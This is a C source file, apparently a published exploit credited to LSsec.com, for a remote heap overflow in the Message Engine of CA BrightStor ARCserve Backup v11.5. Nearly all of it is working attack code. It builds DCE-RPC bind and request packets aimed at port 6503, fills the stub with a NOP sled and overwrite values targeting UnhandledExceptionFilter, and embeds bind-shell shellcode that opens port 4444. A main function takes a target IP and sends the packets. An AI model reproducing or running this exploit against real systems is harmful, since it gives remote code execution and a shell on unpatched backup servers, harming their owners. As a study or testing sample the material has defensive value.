/*
 * LSsec.com
 *
 * CA BrightStor ARCserve Backup v11.5 Message Engine Remote Heap Overflow Exploit
 *
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")
#pragma pack(1)

#define _DCE_RPC_REQ  0x00
#define _DCE_RPC_BIND 0x0B

#define PKT_LEN  2048+24
#define STUB_LEN 2048

unsigned char jmp[]="\xeb\x0a\x90\x90";
unsigned char esi[]="\xbf\x75\x40\x2d";
unsigned char uef[]="\x4c\x14\x54\x7c";

//4444
unsigned char bindshell[]=
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0"
"\x6f\xe3\x2a\x83\xeb\xfc\xe2\xf4\x1c\x05\x08\x67\x08\x96\x1c\xd5"
"\x1f\x0f\x68\x46\xc4\x4b\x68\x6f\xdc\xe4\x9f\x2f\x98\x6e\x0c\xa1"
"\xaf\x77\x68\x75\xc0\x6e\x08\x63\x6b\x5b\x68\x2b\x0e\x5e\x23\xb3"
"\x4c\xeb\x23\x5e\xe7\xae\x29\x27\xe1\xad\x08\xde\xdb\x3b\xc7\x02"
"\x95\x8a\x68\x75\xc4\x6e\x08\x4c\x6b\x63\xa8\xa1\xbf\x73\xe2\xc1"
"\xe3\x43\x68\xa3\x8c\x4b\xff\x4b\x23\x5e\x38\x4e\x6b\x2c\xd3\xa1"
"\xa0\x63\x68\x5a\xfc\xc2\x68\x6a\xe8\x31\x8b\xa4\xae\x61\x0f\x7a"
"\x1f\xb9\x85\x79\x86\x07\xd0\x18\x88\x18\x90\x18\xbf\x3b\x1c\xfa"
"\x88\xa4\x0e\xd6\xdb\x3f\x1c\xfc\xbf\xe6\x06\x4c\x61\x82\xeb\x28"
"\xb5\x05\xe1\xd5\x30\x07\x3a\x23\x15\xc2\xb4\xd5\x36\x3c\xb0\x79"
"\xb3\x3c\xa0\x79\xa3\x3c\x1c\xfa\x86\x07\xf2\x76\x86\x3c\x6a\xcb"
"\x75\x07\x47\x30\x90\xa8\xb4\xd5\x36\x05\xf3\x7b\xb5\x90\x33\x42"
"\x44\xc2\xcd\xc3\xb7\x90\x35\x79\xb5\x90\x33\x42\x05\x26\x65\x63"
"\xb7\x90\x35\x7a\xb4\x3b\xb6\xd5\x30\xfc\x8b\xcd\x99\xa9\x9a\x7d"
"\x1f\xb9\xb6\xd5\x30\x09\x89\x4e\x86\x07\x80\x47\x69\x8a\x89\x7a"
"\xb9\x46\x2f\xa3\x07\x05\xa7\xa3\x02\x5e\x23\xd9\x4a\x91\xa1\x07"
"\x1e\x2d\xcf\xb9\x6d\x15\xdb\x81\x4b\xc4\x8b\x58\x1e\xdc\xf5\xd5"
"\x95\x2b\x1c\xfc\xbb\x38\xb1\x7b\xb1\x3e\x89\x2b\xb1\x3e\xb6\x7b"
"\x1f\xbf\x8b\x87\x39\x6a\x2d\x79\x1f\xb9\x89\xd5\x1f\x58\x1c\xfa"
"\x6b\x38\x1f\xa9\x24\x0b\x1c\xfc\xb2\x90\x33\x42\x10\xe5\xe7\x75"
"\xb3\x90\x35\xd5\x30\x6f\xe3\x2a";

typedef struct dceRpc{
	unsigned char	ver;
	unsigned char	ver_minor;
	unsigned char	pkt_type;
	unsigned char	pkt_flags;
	unsigned long	data_repres;
	unsigned short	frag_len;
	unsigned short	auth_len;
	unsigned long	caller_id;
} DCE_RPC, *PDCE_RPC;

typedef struct dceRpc2{
	unsigned long	alloc_hint;
	unsigned short	con_id;
	unsigned short	opnum;
} DCE_RPC2, *PDCE_RPC2;

typedef struct dceRpcBind{
	unsigned short	max_xmit;
	unsigned short	max_recv;
	unsigned long	asc_group;
	unsigned long	num_con_items;
	unsigned short	con_id;
	unsigned short	num_trn_items;
} DCE_RPC_BIND, *PDCE_RPC_BIND;

int
lsHex2Raw(unsigned char* s, unsigned char* out)
{
	unsigned long i;
	unsigned long j=0;
	unsigned long len;
	unsigned long ret=0;

	len=strlen(s);

	for(i=0; i<len; i+=2){
		if((s[i]>=0x30)&&(s[i]<=0x39))
			j=s[i]-0x30;
		else
			j=s[i]-0x61+10;
		j*=16;
		if((s[i+1]>=0x30)&&(s[i+1]<=0x39))
			j+=s[i+1]-0x30;
		else
			j+=s[i+1]-0x61+10;
		out[ret]=(unsigned char)j;
		ret++;
	}

	return(ret);
}

void
lsInverse(unsigned char* io, unsigned long len)
{
	unsigned char c;
	unsigned long i;

	for(i=0; i<len/2; i++){
		c=io[len-i-1];
		io[len-i-1]=io[i];
		io[i]=c;
	}
}

int
lsEncodeUuid(unsigned char* uuid, unsigned char* out)
{
	unsigned ar=0;
	unsigned cnt=0;
	unsigned long i;
	unsigned long len;
	unsigned long ret;
	unsigned char* ptr;

	ptr=uuid;
	len=strlen(uuid);

	for(i=0; i<len; i++){
		if(uuid[i]=='-'){
			uuid[i]='\0';
			if(ar<3){
				ret=lsHex2Raw(ptr, out);
				lsInverse(out, ret);
				out+=ret;
				cnt+=ret;
			}else{
				ret=lsHex2Raw(ptr, out);
				out+=ret;
				cnt+=ret;
			}
			ptr=uuid+i+1;
			ar++;
		}
	}
	out[len]='\0';
	ret=lsHex2Raw(ptr, out);
	out+=ret;
	cnt+=ret;

	return(cnt);
}

unsigned char*
lsDceRpcBind(unsigned long cid, unsigned char* uuid, unsigned short ver, unsigned long* pktLen){
	unsigned char* pkt;
	unsigned char* tmp;
	unsigned char  transferSyntax[]="8a885d04-1ceb-11c9-9fe8-08002b104860";
	unsigned short ret;
	unsigned long  cnt;
	PDCE_RPC_BIND rpc_bind;
	PDCE_RPC rpc;

	pkt=(unsigned char*)calloc(2048, 1);

/* 2nd half */
	tmp=pkt;
	pkt+=sizeof(DCE_RPC);
	rpc_bind=(PDCE_RPC_BIND)pkt;
	rpc_bind->max_xmit      = 0x16D0;		//Max Xmit Frag
	rpc_bind->max_recv      = 0x16D0;		//Max Recv Frag
	rpc_bind->asc_group     = 0;     		//Assoc Group
	rpc_bind->num_con_items = 1;     		//Num Ctx Items
	rpc_bind->con_id        = 0;     		//Context ID
	rpc_bind->num_trn_items = 1;     		//Num Trans Items
	pkt+=sizeof(DCE_RPC_BIND);
	cnt=lsEncodeUuid(uuid, pkt);             //Interface UUID
	pkt+=cnt;
	memcpy(pkt, &ver, sizeof(short));		//Interface Ver
	pkt+=sizeof(short);
	*pkt++=0;                        		//Interface Ver Minor
	*pkt++=0;                        		//Interface Ver Minor
	cnt=lsEncodeUuid(transferSyntax, pkt);	//Transfer Syntax
	pkt+=cnt;
	*pkt++=2;                        		//Transfer Syntax Ver
	*pkt++=0;                        		//Transfer Syntax Ver

/* 1st half */
	ret=pkt+2-tmp;
	rpc=(PDCE_RPC)tmp;
	rpc->ver         = 5;            		//Version
	rpc->ver_minor   = 0;            		//Version (minor)
	rpc->pkt_type    = _DCE_RPC_BIND;		//Packet Type
	rpc->pkt_flags   = 3;            		//Packet Flags
	rpc->data_repres = 16;           		//Data Representation
	rpc->frag_len    = ret;        		    //Frag Length
	rpc->auth_len    = 0;            		//Auth Length
	rpc->caller_id   = cid;          		//Call ID

	*pktLen=ret;

	return(tmp);
}

unsigned char*
lsDceRpcReq(unsigned long  cid, unsigned long opnum, unsigned char* uuid, unsigned int encoding, unsigned long flags, unsigned long* pktLen){
	unsigned char* pkt;
	unsigned char* tmp;
	unsigned char  stub[STUB_LEN];
	unsigned short ret;
	unsigned long  cnt;
	PDCE_RPC  rpc;
	PDCE_RPC2 rpc2;

	pkt=(unsigned char*)calloc(PKT_LEN, 1);

/* 2nd half */
	tmp=pkt;
	pkt+=sizeof(DCE_RPC);
	rpc2=(PDCE_RPC2)pkt;
	rpc2->alloc_hint = STUB_LEN;       //Stub Data
	rpc2->con_id     = 0;              //Context ID
	rpc2->opnum      = opnum;          //Operation Number
	pkt+=sizeof(DCE_RPC2);

	if(encoding){
		cnt=lsEncodeUuid(uuid, pkt);    //Interface UUID
		pkt+=cnt;
	}

/* stub modification */

	memset(stub, 0x90, STUB_LEN);

	memcpy(stub+680, jmp, sizeof(jmp)-1);

	//call dword ptr ds:[esi+48]

	memcpy(stub+684, esi, sizeof(esi)-1);

	//UnhandledExceptionFilter

	memcpy(stub+688, uef, sizeof(uef)-1);

	memcpy(stub+692, bindshell, sizeof(bindshell)-1);

/* ----------------- */

	memcpy(pkt, stub, STUB_LEN);
	pkt+=STUB_LEN;

/* 1st half */
	ret=pkt-tmp;
	rpc=(PDCE_RPC)tmp;
	rpc->ver         = 5;              //Version
	rpc->ver_minor   = 0;              //Version (minor)
	rpc->pkt_type    = _DCE_RPC_REQ;   //Packet Type
	rpc->pkt_flags   = flags;          //Packet Flags
	rpc->data_repres = 16;             //Data Representation
	rpc->frag_len    = ret;            //Frag Length
	rpc->auth_len    = 0;              //Auth Length
	rpc->caller_id   = cid;            //Call ID

	*pktLen=ret;

	return(tmp);
}

int
lsConnect(unsigned char* host, unsigned short port){
	int s;
	struct hostent* he;
	struct sockaddr_in addr;
	WSADATA wsa;

	WSAStartup(MAKEWORD(2,0), &wsa);
	if((he=gethostbyname(host))==NULL){
		printf("[-] unable to resolve %s\n", host);
		exit(1);
	}

	if((s=socket(AF_INET, SOCK_STREAM, 0))<0){
		printf("[-] socket failed\n");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port   = htons(port);
	addr.sin_addr   = *((struct in_addr*)he->h_addr);
	memset(&(addr.sin_zero), '\0', 8);

	if(connect(s, (struct sockaddr*)&addr, sizeof(struct sockaddr))<0){
		printf("[-] connect failed\n");
		exit(1);
	}

	return(s);
}

void
lsSend(int s, unsigned char* pkt, unsigned long cnt){
	if(send(s, pkt, cnt, 0)==-1){
		printf("[-] send failed\n");
		exit(1);
	}
}

void
lsRecv(int s){
	char recvBuf[4096];

	if(recv(s, recvBuf, 4096, 0)<=0){
		printf("[-] recv failed\n");
		exit(1);
	}
}

int
main(int argc, char* argv[]){
	int s;
	unsigned long  cnt;
	unsigned char* pkt=NULL;
	unsigned char  uuidSave[64];

	/**********************************************************/

	int opnum=43;
	unsigned short port= 6503;
	unsigned char  uuid[]="dc246bf0-7a7a-11ce-9f88-00805fe43838";

	/**********************************************************/

	if(argc!=2){
		printf("\n[-] Usage: %s <ip>\n", argv[0]);
		exit(1);
	}

	printf("\n[+] LSsec.com\n");
	printf("\n[+] CA BrightStor ARCserve Backup v11.5 Message Engine Remote Heap Overflow Exploit\n");

	s=lsConnect(argv[1], port);

	memset(uuidSave, '\0', sizeof(uuidSave));
	strncpy(uuidSave, uuid, strlen(uuid));

	//bind packet
	pkt=lsDceRpcBind(1, uuid, 1, &cnt);
	lsSend(s, pkt, cnt);
	lsRecv(s);
	free(pkt);

	//request
	pkt=lsDceRpcReq(1, opnum, uuidSave, 0, 0x03, &cnt);
	lsSend(s, pkt, cnt);
	lsRecv(s);
	free(pkt);

	return(0);
}
